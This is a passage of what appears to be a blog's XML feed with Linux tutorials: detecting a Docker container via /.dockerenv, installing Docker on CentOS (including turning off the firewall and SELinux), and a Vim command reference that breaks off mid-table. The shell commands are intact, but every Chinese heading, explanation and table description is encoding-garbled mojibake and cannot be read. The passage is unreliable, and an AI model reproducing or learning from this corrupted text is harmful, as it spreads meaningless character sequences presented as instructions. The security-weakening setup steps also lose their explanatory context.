<p>ä¹Ÿå¯ä»¥é€šè¿‡<code>ls -alh /.dockerenv</code>æŸ¥çœ‹æ˜¯å¦æœ‰å®¹å™¨ç¯å¢ƒæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@92a79e791862 /]# <span class="built_in">ls</span> -a /</span><br><span class="line">.   .dockerenv         bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">..  anaconda-post.log  boot  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="line">[root@92a79e791862 /]# <span class="built_in">ls</span> -a /.dockerenv  </span><br><span class="line">/.dockerenv</span><br></pre></td></tr></table></figure>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>ã€Linuxã€‘dockerå®‰è£…</title>
    <url>/posts/b1246162/</url>
    <content><![CDATA[<h2 id="dockerå®‰è£…">dockerå®‰è£…</h2>
<ol>
<li class="lvl-3"><strong>å…³é—­å®‰å…¨ç¨‹åº</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl stop iptables</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">systemctl <span class="built_in">disable</span> iptable</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹selinuxæ˜¯å¦å…³é—­</span><br><span class="line">getenforce </span><br><span class="line">å¦‚æœçœ‹åˆ°æ˜¯disabledå°±è¯´æ˜å…³é—­äº†</span><br><span class="line">å¦‚æœçœ‹åˆ°enforcingå°±è¯æ˜å¼€ç€</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹</span><br><span class="line">sed -i <span class="string">&#x27;7s#enforcing#disabled#g&#x27;</span> /etc/selinux/config</span><br><span class="line">ç”Ÿæ•ˆ</span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p><strong>è®©æ—¶é—´åŒæ­¥</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y ntp ntpdate</span><br><span class="line">ntpdate cn.pool.ntp.org</span><br><span class="line"></span><br><span class="line">æ‰§è¡Œè®¡åˆ’ä»»åŠ¡</span><br><span class="line">crontab -e</span><br><span class="line">* * * * * /usr/sbin/ntpdate  cn.pool.ntp.org &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line">é‡å¯è®¡åˆ’ä»»åŠ¡</span><br><span class="line">systemctl restart crond</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p><strong>å®‰è£…åŸºç¡€ä¾èµ–ç¨‹åº</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line">yum install -y device-mapper-persistent-data lvm2 wget net-tools nfs-utils lrzsz gcc gcc-c++ make cmake libxml2-devel openssl-devel curl curl-devel unzip <span class="built_in">sudo</span> ntp libaio-devel wget vim ncurses-devel autoconf automake zlib-develÂ  python-devel epel-release openssh-server socatÂ  ipvsadm conntrack telnet ipvsadm  yum-utils</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p><strong>å®‰è£…é˜¿é‡Œäº‘dockeræº</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">å®‰è£…dockerï¼š</span><br><span class="line">yum install docker-ce -y</span><br><span class="line"></span><br><span class="line">å®‰è£…å®Œæ¯•åå¯ä»¥æ‰§è¡Œ</span><br><span class="line">docker version</span><br><span class="line">æŸ¥çœ‹dockerç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">å¯åŠ¨å¹¶å¼€æœºè¿è¡Œdocker</span><br><span class="line">systemctl start docker &amp;&amp; systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line">æ£€æŸ¥dockeræ˜¯å¦å¯åŠ¨æˆåŠŸ</span><br><span class="line">systemctl status docker</span><br><span class="line">çœ‹åˆ°runningå°±æ˜¯æˆåŠŸäº†</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p><strong>ä¿®æ”¹å†…æ ¸å‚æ•°</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/sysctl.d/docker.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class="line"><span class="string">net.ipv4.ip_forward = 1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">ä¿®æ”¹å®ŒæŸ¥çœ‹ç¡®è®¤æ— è¯¯</span><br><span class="line"><span class="built_in">cat</span> /etc/sysctl.d/docker.conf</span><br><span class="line"></span><br><span class="line">ç”Ÿæ•ˆï¼š</span><br><span class="line">sysctl -p /etc/sysctl.d/docker.conf</span><br><span class="line"></span><br><span class="line">ç¡®è®¤å†…æ ¸çŠ¶æ€</span><br><span class="line">lsmod | grep br_netfilter</span><br><span class="line"></span><br><span class="line">é‡å¯åä¼šå¤±æ•ˆï¼Œä¸ºäº†é˜²æ­¢æ­¤æƒ…å†µ</span><br><span class="line">vim /etc/sysconfig/modules/br_netfilter.modules</span><br><span class="line">ç¼–å†™å†…å®¹ï¼š</span><br><span class="line">modprobe br_netfilter</span><br><span class="line">ä¿å­˜é€€å‡º</span><br><span class="line"></span><br><span class="line">ç»™ä»–æ‰§è¡Œæƒé™</span><br><span class="line"><span class="built_in">chmod</span> +x /etc/sysconfig/modules/br_netfilter.modules</span><br><span class="line"></span><br><span class="line">åˆ›å»ºä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼š</span><br><span class="line">vim /etc/rc.sysinit</span><br><span class="line">å†…å®¹ï¼š</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> /etc/sysconfig/modules/*.modules</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  [ -x <span class="variable">$file</span> ] &amp;&amp; <span class="variable">$file</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">ä¿å­˜é€€å‡º</span><br><span class="line">å¯ä»¥é€šè¿‡rebootå‘½ä»¤é‡å¯æœåŠ¡å™¨æŸ¥çœ‹æ˜¯å¦ç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>ã€Linuxã€‘Vimä½¿ç”¨åŠæ–‡æœ¬å¤„ç†</title>
    <url>/posts/247a4e5f/</url>
    <content><![CDATA[<h2 id="vimçš„ä½¿ç”¨">vimçš„ä½¿ç”¨</h2>
<h3 id="ä»€ä¹ˆæ˜¯-vimï¼Ÿ">ä»€ä¹ˆæ˜¯ vimï¼Ÿ</h3>
<p>Vimæ˜¯ä» vi å‘å±•å‡ºæ¥çš„ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ã€‚ä»£ç è¡¥å®Œã€ç¼–è¯‘åŠé”™è¯¯è·³è½¬ç­‰æ–¹ä¾¿ç¼–ç¨‹çš„åŠŸèƒ½ç‰¹åˆ«ä¸°å¯Œï¼Œåœ¨ç¨‹åºå‘˜ä¸­è¢«å¹¿æ³›ä½¿ç”¨ã€‚vim çš„å®˜æ–¹ç½‘ç«™ (<a href="http://www.vim.org/">http://www.vim.org</a>)</p>
<p>vim é”®ç›˜å›¾ï¼š</p>
<p><img src="/posts/247a4e5f//11de8c1d4c8385c025ede918e03b6a86.gif" alt="img"></p>
<p>åŸºæœ¬ä¸Šviå¯ä»¥åˆ†ä¸ºä¸‰ç§çŠ¶æ€ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å‘½ä»¤æ¨¡å¼ï¼ˆcommand mode)</p>
</li>
<li class="lvl-2">
<p>æ’å…¥æ¨¡å¼ï¼ˆInsert mode)</p>
</li>
<li class="lvl-2">
<p>åº•è¡Œæ¨¡å¼ï¼ˆlast line mode)</p>
</li>
</ul>
<span id="more"></span>
<h3 id="vi-vimçš„ä¸‰ç§æ¨¡å¼">vi/vimçš„ä¸‰ç§æ¨¡å¼</h3>
<p>vi/vimä¸»è¦åˆ†ä¸ºä¸‰ç§æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯<strong>å‘½ä»¤æ¨¡å¼ï¼ˆCommand modeï¼‰</strong>ï¼Œ<strong>è¾“å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰**å’Œ**åº•çº¿å‘½ä»¤æ¨¡å¼ï¼ˆLast line modeï¼‰</strong>ã€‚</p>
<p><img src="/posts/247a4e5f//1cee092565d316d1462ddbf987fbc6e1.png" alt="img"></p>
<p>è¿™ä¸‰ç§æ¨¡å¼çš„ä½œç”¨åˆ†åˆ«æ˜¯ï¼š</p>
<h4 id="è¾“å…¥æ¨¡å¼">è¾“å…¥æ¨¡å¼</h4>
<p>åœ¨å‘½ä»¤æ¨¡å¼ä¸‹è¾“å…¥æ’å…¥å‘½ä»¤iã€é™„åŠ å‘½ä»¤a ã€æ‰“å¼€å‘½ä»¤oã€ä¿®æ”¹å‘½ä»¤cã€å–ä»£å‘½ä»¤ræˆ–æ›¿æ¢å‘½ä»¤séƒ½å¯ä»¥è¿›å…¥æ–‡æœ¬è¾“å…¥æ¨¡å¼ã€‚åœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œç”¨æˆ·è¾“å…¥çš„ä»»ä½•å­—ç¬¦éƒ½è¢«Viå½“åšæ–‡ä»¶å†…å®¹ä¿å­˜èµ·æ¥ï¼Œå¹¶å°†å…¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚åœ¨æ–‡æœ¬è¾“å…¥è¿‡ç¨‹ä¸­ï¼Œè‹¥æƒ³å›åˆ°å‘½ä»¤æ¨¡å¼ä¸‹ï¼ŒæŒ‰é”®ESCå³å¯ã€‚</p>
<h4 id="å‘½ä»¤æ¨¡å¼">å‘½ä»¤æ¨¡å¼</h4>
<p>ç”¨æˆ·åˆšåˆšå¯åŠ¨ vi/vimï¼Œä¾¿è¿›å…¥äº†å‘½ä»¤æ¨¡å¼ã€‚ ä»»ä½•æ—¶å€™ï¼Œä¸ç®¡ç”¨æˆ·å¤„äºä½•ç§æ¨¡å¼ï¼Œåªè¦æŒ‰ä¸€ä¸‹ESCé”®ï¼Œå³å¯ä½¿Viè¿›å…¥å‘½ä»¤æ¨¡å¼ï¼›</p>
<p>æ­¤çŠ¶æ€ä¸‹æ•²å‡»é”®ç›˜åŠ¨ä½œä¼šè¢«Vimè¯†åˆ«ä¸ºå‘½ä»¤ï¼Œè¾“å…¥<code>:</code> å¯åˆ‡æ¢åˆ°<strong>åº•çº¿å‘½ä»¤æ¨¡å¼</strong>ï¼Œä»¥åœ¨æœ€åº•ä¸€è¡Œè¾“å…¥å‘½ä»¤ã€‚</p>
<p>è‹¥æƒ³è¦ç¼–è¾‘æ–‡æœ¬ï¼šå¯åŠ¨Vimï¼Œè¿›å…¥äº†å‘½ä»¤æ¨¡å¼ï¼ŒæŒ‰ä¸‹iï¼Œåˆ‡æ¢åˆ°è¾“å…¥æ¨¡å¼ã€‚</p>
<h4 id="åº•è¡Œæ¨¡å¼">åº•è¡Œæ¨¡å¼</h4>
<p>åœ¨å‘½ä»¤æ¨¡å¼ä¸‹æŒ‰ä¸‹:ï¼ˆè‹±æ–‡å†’å·ï¼‰å°±è¿›å…¥äº†åº•è¡Œå‘½ä»¤æ¨¡å¼ã€‚</p>
<p>åº•çº¿å‘½ä»¤æ¨¡å¼å¯ä»¥è¾“å…¥å•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦çš„å‘½ä»¤ï¼Œå¯ç”¨çš„å‘½ä»¤éå¸¸å¤šã€‚</p>
<p>åœ¨åº•çº¿å‘½ä»¤æ¨¡å¼ä¸­ï¼ŒåŸºæœ¬çš„å‘½ä»¤æœ‰ï¼ˆå·²ç»çœç•¥äº†å†’å·ï¼‰ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>q é€€å‡ºç¨‹åº</p>
</li>
<li class="lvl-2">
<p>w ä¿å­˜æ–‡ä»¶</p>
</li>
</ul>
<p>æŒ‰ESCé”®å¯éšæ—¶é€€å‡ºåº•çº¿å‘½ä»¤æ¨¡å¼ã€‚</p>
<h3 id="vimåŸºç¡€æ“ä½œ">vimåŸºç¡€æ“ä½œ</h3>
<h4 id="è¿›å…¥è¾“å…¥æ¨¡å¼-Insert-mode">è¿›å…¥è¾“å…¥æ¨¡å¼(Insert mode)</h4>
<p><img src="/posts/247a4e5f//90d3f3acdaa32af011e62e7be564f47c.png" alt="1574384484673"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>i: æ’å…¥å…‰æ ‡å‰ä¸€ä¸ªå­—ç¬¦</p>
</li>
<li class="lvl-2">
<p>I: æ’å…¥è¡Œé¦–</p>
</li>
<li class="lvl-2">
<p>a: æ’å…¥å…‰æ ‡åä¸€ä¸ªå­—ç¬¦</p>
</li>
<li class="lvl-2">
<p>A: æ’å…¥è¡Œæœª</p>
</li>
<li class="lvl-2">
<p>o: å‘ä¸‹æ–°å¼€ä¸€è¡Œ,æ’å…¥è¡Œé¦–</p>
</li>
<li class="lvl-2">
<p>O: å‘ä¸Šæ–°å¼€ä¸€è¡Œ,æ’å…¥è¡Œé¦–</p>
</li>
</ul>
<p>åœ¨è¿›å…¥è¾“å…¥æ¨¡å¼åï¼Œ vi ç”»é¢çš„å·¦ä¸‹è§’å¤„ä¼šå‡ºç°ã€â€“INSERTâ€“ã€çš„å­—æ ·</p>
<h4 id="è¿›å…¥æ›¿æ¢æ¨¡å¼-Replace-mode">è¿›å…¥æ›¿æ¢æ¨¡å¼(Replace mode)</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>r : åªä¼šå–ä»£å…‰æ ‡æ‰€åœ¨çš„é‚£ä¸€ä¸ªå­—ç¬¦ä¸€æ¬¡</p>
</li>
<li class="lvl-2">
<p>R: ä¼šä¸€ç›´å–ä»£å…‰æ ‡æ‰€åœ¨çš„æ–‡å­—ï¼Œç›´åˆ°æŒ‰ä¸‹ESCä¸ºæ­¢</p>
</li>
</ul>
<p>åœ¨è¿›å…¥è¾“å…¥æ¨¡å¼åï¼Œ vi ç”»é¢çš„å·¦ä¸‹è§’å¤„ä¼šå‡ºç°ã€â€“REPLACEâ€“ã€çš„å­—æ ·</p>
<h4 id="å‘½ä»¤æ¨¡å¼å¸¸ç”¨å‘½ä»¤">å‘½ä»¤æ¨¡å¼å¸¸ç”¨å‘½ä»¤</h4>
<h5 id="ç§»åŠ¨å…‰æ ‡">ç§»åŠ¨å…‰æ ‡</h5>
<table>
<thead>
<tr>
<th>ç§»åŠ¨å…‰æ ‡çš„æ–¹æ³•</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>h æˆ– å‘å·¦ç®­å¤´é”®(â†)</td>
<td>å…‰æ ‡å‘å·¦ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>j æˆ– å‘ä¸‹ç®­å¤´é”®(â†“)</td>
<td>å…‰æ ‡å‘ä¸‹ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>k æˆ– å‘ä¸Šç®­å¤´é”®(â†‘)</td>
<td>å…‰æ ‡å‘ä¸Šç§»åŠ¨ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>l æˆ– å‘å³ç®­å¤´é”®(â†’)</td>
<td>å…‰æ ‡å‘å³ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>å‘ä¸‹ç§»åŠ¨ 30 è¡Œï¼Œå¯ä»¥ä½¿ç”¨ â€œ30jâ€ æˆ– â€œ30â†“â€ çš„ç»„åˆæŒ‰é”®</td>
<td></td>
</tr>
<tr>
<td>[Ctrl] + [f]</td>
<td>å±å¹•ã€å‘ä¸‹ã€ç§»åŠ¨ä¸€é¡µï¼Œç›¸å½“äº [Page Down]æŒ‰é”® (å¸¸ç”¨)</td>
</tr>
<tr>
<td>[Ctrl] + [b]</td>
<td>å±å¹•ã€å‘ä¸Šã€ç§»åŠ¨ä¸€é¡µï¼Œç›¸å½“äº [Page Up] æŒ‰é”® (å¸¸ç”¨)</td>
</tr>
<tr>
<td>[Ctrl] + [d]</td>
<td>å±å¹•ã€å‘ä¸‹ã€ç§»åŠ¨åŠé¡µ</td>
</tr>
<tr>
<td>[Ctrl] + [u]</td>
<td>å±å¹•ã€å‘ä¸Šã€ç§»åŠ¨åŠé¡µ</td>
</tr>
<tr>
<td>+</td>
<td>å…‰æ ‡ç§»åŠ¨åˆ°éç©ºæ ¼ç¬¦çš„ä¸‹ä¸€è¡Œ</td>
</tr>
<tr>
<td>-</td>
<td>å…‰æ ‡ç§»åŠ¨åˆ°éç©ºæ ¼ç¬¦çš„ä¸Šä¸€è¡Œ</td>
</tr>
<tr>
<td>n</td>
<td>è¡¨ç¤ºç©ºæ ¼å…‰æ ‡å‘å³ç§»åŠ¨è¿™ä¸€è¡Œçš„ n ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ 20 åˆ™å…‰æ ‡ä¼šå‘åé¢ç§»åŠ¨ 20 ä¸ªå­—ç¬¦è·ç¦»ã€‚</td>
</tr>
<tr>
<td>0 æˆ–åŠŸèƒ½é”®[Home]</td>
<td>è¿™æ˜¯æ•°å­—ã€ 0 ã€ï¼šç§»åŠ¨åˆ°è¿™ä¸€è¡Œçš„æœ€å‰é¢å­—ç¬¦å¤„ (å¸¸ç”¨)</td>
</tr>
<tr>
<td>$ æˆ–åŠŸèƒ½é”®[End]</td>
<td>ç§»åŠ¨åˆ°è¿™ä¸€è¡Œçš„æœ€åé¢å­—ç¬¦å¤„(å¸¸ç”¨)</td>
</tr>
<tr>
<td>H</td>
<td>å…‰æ ‡ç§»åŠ¨åˆ°è¿™ä¸ªå±å¹•çš„æœ€ä¸Šæ–¹é‚£ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>M</td>
<td>å…‰æ ‡ç§»åŠ¨åˆ°è¿™ä¸ªå±å¹•çš„ä¸­å¤®é‚£ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>L</td>
<td>å…‰æ ‡ç§»åŠ¨åˆ°è¿™ä¸ªå±å¹•çš„æœ€ä¸‹æ–¹é‚£ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>G</td>
<td>ç§»åŠ¨åˆ°è¿™ä¸ªæ–‡æ¡£çš„æœ€åä¸€è¡Œ(å¸¸ç”¨)</td>
</tr>
<tr>
<td>nG</td>
<td>n ä¸ºæ•°å­—ã€‚ç§»åŠ¨åˆ°è¿™ä¸ªæ–‡ä»¶çš„ç¬¬ n è¡Œã€‚ä¾‹å¦‚ 20G åˆ™ä¼šç§»åŠ¨åˆ°è¿™ä¸ªæ–‡ä»¶çš„ç¬¬ 20 è¡Œ(å¯é…åˆ :set nu)</td>
</tr>
<tr>
<td>gg</td>
<td>ç§»åŠ¨åˆ°è¿™ä¸ªæ–‡æ¡£çš„ç¬¬ä¸€è¡Œï¼Œç›¸å½“äº 1G</td>
</tr>
<tr>
<td>n</td>
<td>n ä¸ºæ•°å­—ã€‚å…‰æ ‡å‘ä¸‹ç§»åŠ¨ n è¡Œ(å¸¸ç”¨)</td>
</tr>
</tbody>
</table>
<h5 id="åˆ é™¤æ“ä½œ">åˆ é™¤æ“ä½œ</h5>
<table>
<thead>
<tr>
<th>åˆ é™¤æ“ä½œ</th>
<th>åˆ é™¤åä¼šæ·»åŠ åˆ°å‰ªåˆ‡æ¿ï¼Œç›¸å½“äºå‰ªåˆ‡</th>
</tr>
</thead>
<tbody>
<tr>
<td>x, X</td>
<td>xä¸ºå‘ååˆ é™¤ä¸€ä¸ªå­—ç¬¦ (ç›¸å½“äº [del] æŒ‰é”®)ï¼Œ Xä¸ºå‘å‰åˆ é™¤ä¸€ä¸ªå­—ç¬¦(ç›¸å½“äº [backspace] )</td>
</tr>
<tr>
<td>nx</td>
<td>n ä¸ºæ•°å­—ï¼Œè¿ç»­å‘ååˆ é™¤ n ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚10xè¡¨ç¤ºè¿ç»­åˆ é™¤ 10 ä¸ªå­—ç¬¦ã€‚</td>
</tr>
<tr>
<td>dd</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨çš„ä¸€æ•´è¡Œ(å¸¸ç”¨)</td>
</tr>
<tr>
<td>ndd</td>
<td>n ä¸ºæ•°å­—ã€‚åˆ é™¤å…‰æ ‡æ‰€åœ¨çš„å‘ä¸‹ n è¡Œï¼Œä¾‹å¦‚ 20dd åˆ™æ˜¯åˆ é™¤ 20 è¡Œ</td>
</tr>
<tr>
<td>d1G</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œåˆ°é¦–è¡Œçš„æ‰€æœ‰æ•°æ®</td>
</tr>
<tr>
<td>dG</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œåˆ°æœ€åä¸€è¡Œçš„æ‰€æœ‰æ•°æ®</td>
</tr>
<tr>
<td>d$</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®åˆ°è¯¥è¡Œçš„æœ€åä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>d0</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®åˆ°è¯¥è¡Œçš„æœ€å‰é¢ä¸€ä¸ªå­—ç¬¦</td>
</tr>
</tbody>
</table>
<h5 id="æ’¤é”€-å¤åŸ-é‡å¤">æ’¤é”€&amp;å¤åŸ&amp;é‡å¤</h5>
<table>
<thead>
<tr>
<th>æ’¤é”€&amp;å¤åŸ</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>æ’¤é”€æ“ä½œï¼Œç›¸å¯¹äºæ™®é€šç¼–è¾‘å™¨é‡Œé¢çš„ctrl+z</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td>æ¢å¤æ“ä½œï¼Œç›¸å¯¹äºæ™®é€šç¼–è¾‘å™¨é‡Œé¢çš„ctrl+y</td>
</tr>
<tr>
<td>.</td>
<td>å°±æ˜¯å°æ•°ç‚¹ï¼å¯é‡å¤å‰ä¸€ä¸ªåŠ¨ä½œ</td>
</tr>
</tbody>
</table>
<h5 id="å¤åˆ¶-ç²˜è´´">å¤åˆ¶&amp;ç²˜è´´</h5>
<table>
<thead>
<tr>
<th>å¤åˆ¶&amp;ç²˜è´´</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>yy</td>
<td>å¤åˆ¶å…‰æ ‡æ‰€åœ¨è¡Œ</td>
</tr>
<tr>
<td>nyy</td>
<td>n ä¸ºæ•°å­—ã€‚å¤åˆ¶å…‰æ ‡æ‰€åœ¨çš„å‘ä¸‹ n è¡Œï¼Œä¾‹å¦‚ 20yy åˆ™æ˜¯å¤åˆ¶ 20 è¡Œ</td>
</tr>
<tr>
<td>y1G</td>
<td>å¤åˆ¶å…‰æ ‡æ‰€åœ¨è¡Œåˆ°ç¬¬ä¸€è¡Œçš„æ‰€æœ‰æ•°æ®</td>
</tr>
<tr>
<td>yG</td>
<td>å¤åˆ¶å…‰æ ‡æ‰€åœ¨è¡Œåˆ°æœ€åä¸€è¡Œçš„æ‰€æœ‰æ•°æ®</td>
</tr>
<tr>
<td>y0</td>
<td>å¤åˆ¶å…‰æ ‡æ‰€åœ¨çš„é‚£ä¸ªå­—ç¬¦åˆ°è¯¥è¡Œè¡Œé¦–çš„æ‰€æœ‰æ•°æ®</td>
</tr>
<tr>
<td>y$</td>
<td>å¤åˆ¶å…‰æ ‡æ‰€åœ¨çš„é‚£ä¸ªå­—ç¬¦åˆ°è¯¥è¡Œè¡Œå°¾çš„æ‰€æœ‰æ•°æ®</td>
</tr>
<tr>
<td>p, P</td>
<td>p ä¸ºå°†å·²å¤åˆ¶çš„æ•°æ®åœ¨å…‰æ ‡ä¸‹ä¸€è¡Œè´´ä¸Šï¼ŒP åˆ™ä¸ºè´´åœ¨å…‰æ ‡ä¸Šä¸€è¡Œï¼</td>
</tr>
</tbody>
</table>
<h5 id="åˆæˆè¡Œ">åˆæˆè¡Œ</h5>
<ul class="lvl-0">
<li class="lvl-2">
<p>J: å°†å…‰æ ‡æ‰€åœ¨è¡Œä¸ä¸‹ä¸€è¡Œçš„æ•°æ®ç»“åˆæˆåŒä¸€è¡Œ</p>
</li>
</ul>
<h5 id="æœç´¢">æœç´¢</h5>
<table>
<thead>
<tr>
<th>æœç´¢</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>/word</td>
<td>å‘å…‰æ ‡ä¹‹ä¸‹å¯»æ‰¾ä¸€ä¸ªåç§°ä¸º word çš„å­—ç¬¦ä¸²ã€‚</td>
</tr>
<tr>
<td>?word</td>
<td>å‘å…‰æ ‡ä¹‹ä¸Šå¯»æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²åç§°ä¸º word çš„å­—ç¬¦ä¸²ã€‚</td>
</tr>
<tr>
<td>n</td>
<td>ä»£è¡¨é‡å¤å‰ä¸€ä¸ªæœå¯»çš„åŠ¨ä½œï¼Œæ ¹æ®å‰é¢è¾“å…¥çš„/wordè¿˜æ˜¯?wordå‘ä¸‹æˆ–å‘ä¸Šæœç´¢ä¸‹ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä¸²ã€‚</td>
</tr>
<tr>
<td>N</td>
<td>è¡¨ç¤ºåå‘æœç´¢ï¼Œä¸nçš„æœç´¢æ–¹å‘ç›¸åã€‚</td>
</tr>
</tbody>
</table>
<h5 id="æ›¿æ¢">æ›¿æ¢</h5>
<table>
<thead>
<tr>
<th>æ›¿æ¢</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>:n1,n2s/word1/word2/g</td>
<td>åœ¨ç¬¬ n1 ä¸ n2 è¡Œä¹‹é—´å¯»æ‰¾word1å¹¶æ›¿æ¢ä¸ºword2ï¼æ¯”å¦‚ã€:100,200s/vbird/VBIRD/gã€è¡¨ç¤ºåœ¨100åˆ°200è¡Œä¹‹é—´å°†vbirdæ›¿æ¢ä¸ºVBIRD</td>
</tr>
<tr>
<td><code>:1,$s/word1/word2/g</code> æˆ– <code>:%s/word1/word2/g</code></td>
<td>$è¡¨ç¤ºæœ€åä¸€è¡Œï¼Œ%sè¡¨ç¤ºæ‰€æœ‰è¡Œã€‚</td>
</tr>
<tr>
<td><code>:1,$s/word1/word2/gc</code> æˆ– <code>:%s/word1/word2/gc</code></td>
<td>gcä¸­çš„cè¡¨ç¤ºå–ä»£å‰æ˜¾ç¤ºæç¤ºå­—ç¬¦ç»™ç”¨æˆ·ç¡®è®¤ (confirm) ï¼</td>
</tr>
</tbody>
</table>
<h5 id="åº•è¡Œå‘½ä»¤æ¨¡å¼çš„å¸¸ç”¨æ“ä½œ">åº•è¡Œå‘½ä»¤æ¨¡å¼çš„å¸¸ç”¨æ“ä½œ</h5>
<table>
<thead>
<tr>
<th>åº•è¡Œå‘½ä»¤æ¨¡å¼</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>:w</td>
<td>ä¿å­˜ç¼–è¾‘æ•°æ®</td>
</tr>
<tr>
<td>:w!</td>
<td>è‹¥æ–‡ä»¶å±æ€§ä¸ºã€åªè¯»ã€æ—¶ï¼Œå¼ºåˆ¶å†™å…¥è¯¥æ–‡ä»¶ã€‚ä¸è¿‡ï¼Œåˆ°åº•èƒ½ä¸èƒ½å†™å…¥ï¼Œ è¿˜æ˜¯è·Ÿä½ å¯¹è¯¥æ–‡ä»¶çš„æ–‡ä»¶æƒé™æœ‰å…³å•Šï¼</td>
</tr>
<tr>
<td>:q</td>
<td>ç¦»å¼€ vi</td>
</tr>
<tr>
<td>:q!</td>
<td>è‹¥æ›¾ä¿®æ”¹è¿‡æ–‡ä»¶ï¼Œåˆä¸æƒ³å‚¨å­˜ï¼Œä½¿ç”¨ ! ä¸ºå¼ºåˆ¶ç¦»å¼€ä¸å‚¨å­˜æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>æƒŠå¹å· (!) åœ¨ vi å½“ä¸­ï¼Œå¸¸å¸¸å…·æœ‰ã€å¼ºåˆ¶ã€çš„æ„æ€ï½</td>
<td></td>
</tr>
<tr>
<td>:wq</td>
<td>å‚¨å­˜åç¦»å¼€ï¼Œè‹¥ä¸º :wq! åˆ™ä¸ºå¼ºåˆ¶å‚¨å­˜åç¦»å¼€</td>
</tr>
<tr>
<td>ZZ</td>
<td>è‹¥æ–‡ä»¶æ²¡æœ‰æ›´åŠ¨ï¼Œåˆ™ä¸å‚¨å­˜ç¦»å¼€ï¼Œè‹¥æ–‡ä»¶å·²ç»è¢«æ›´åŠ¨è¿‡ï¼Œåˆ™å‚¨å­˜åç¦»å¼€ï¼</td>
</tr>
<tr>
<td>:w [filename]</td>
<td>å¦å­˜ä¸º</td>
</tr>
<tr>
